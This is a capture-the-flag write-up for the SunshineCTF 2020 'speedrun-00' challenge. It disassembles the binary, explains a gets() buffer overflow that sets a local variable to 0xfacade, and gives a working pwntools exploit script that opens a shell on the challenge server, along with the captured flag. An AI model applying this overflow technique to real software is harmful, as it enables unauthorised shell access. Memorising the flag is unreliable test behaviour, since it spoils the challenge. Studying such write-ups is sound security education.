# speedrun-00

## Task

nc chal.2020.sunshinectf.org 30000

File: chal_00

Tag: binary exploitation

## Solution

We use `radare2` to look at the file. We can see that `system` is called somewhere.

```nasm
[0x000005c0]> afl
0x000005c0    1 42           entry0
0x000005f0    4 50   -> 40   sym.deregister_tm_clones
0x00000630    4 66   -> 57   sym.register_tm_clones
0x00000680    5 58   -> 51   sym.__do_global_dtors_aux
0x000006c0    1 10           entry.init0
0x00000790    1 2            sym.__libc_csu_fini
0x00000794    1 9            sym._fini
0x00000720    4 101          sym.__libc_csu_init
0x000006ca    5 82           main
0x00000558    3 23           sym._init
0x00000580    1 6            sym.imp.puts
0x00000590    1 6            sym.imp.system
0x00000000    6 292  -> 318  loc.imp._ITM_deregisterTMCloneTable
0x000005a0    1 6            sym.imp.gets
[0x000005c0]> pdf @ main
            ; DATA XREF from entry0 @ 0x5dd
┌ 82: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x40
│           ; var uint32_t var_8h @ rbp-0x8
│           ; var uint32_t var_4h @ rbp-0x4
│           0x000006ca      55             push rbp
│           0x000006cb      4889e5         mov rbp, rsp
│           0x000006ce      4883ec40       sub rsp, 0x40
│           0x000006d2      488d3dcb0000.  lea rdi, str.This_is_the_only_one ; 0x7a4 ; "This is the only one" ; const char *s
│           0x000006d9      e8a2feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000006de      488d45c0       lea rax, [s]
│           0x000006e2      4889c7         mov rdi, rax                ; char *s
│           0x000006e5      b800000000     mov eax, 0
│           0x000006ea      e8b1feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x000006ef      817dfcdecafa.  cmp dword [var_4h], 0xfacade
│       ┌─< 0x000006f6      750c           jne 0x704
│       │   0x000006f8      488d3dba0000.  lea rdi, str.bin_sh         ; 0x7b9 ; "/bin/sh" ; const char *string
│       │   0x000006ff      e88cfeffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x6f6
│       └─> 0x00000704      817df8decafa.  cmp dword [var_8h], 0xfacade
│       ┌─< 0x0000070b      750c           jne 0x719
│       │   0x0000070d      488d3da50000.  lea rdi, str.bin_sh         ; 0x7b9 ; "/bin/sh" ; const char *string
│       │   0x00000714      e877feffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x70b
│       └─> 0x00000719      90             nop
│           0x0000071a      c9             leave
└           0x0000071b      c3             ret
```

We have a stack of size `0x40` and can input bytes via `gets` to `rbp-0x40`. After that there is a comparison of `0xfacade` with `rbp-0x4`. If they are equal `system` is called with `/bin/sh`.

So we have to write `0x40 - 0x4` bytes of padding and then `0xfacade`.

We write this little script:

```python
from pwn import *

payload  = 'A' * 60
payload += '\xde\xca\xfa'

p = remote('chal.2020.sunshinectf.org', 30000)
#p = process("./chall_00")

p.sendline(payload)
p.interactive()
```

And get our shell:

```bash
$ python chall00.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done
[*] Switching to interactive mode
This is the only one
$ ls
chall_00
flag.txt
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
```
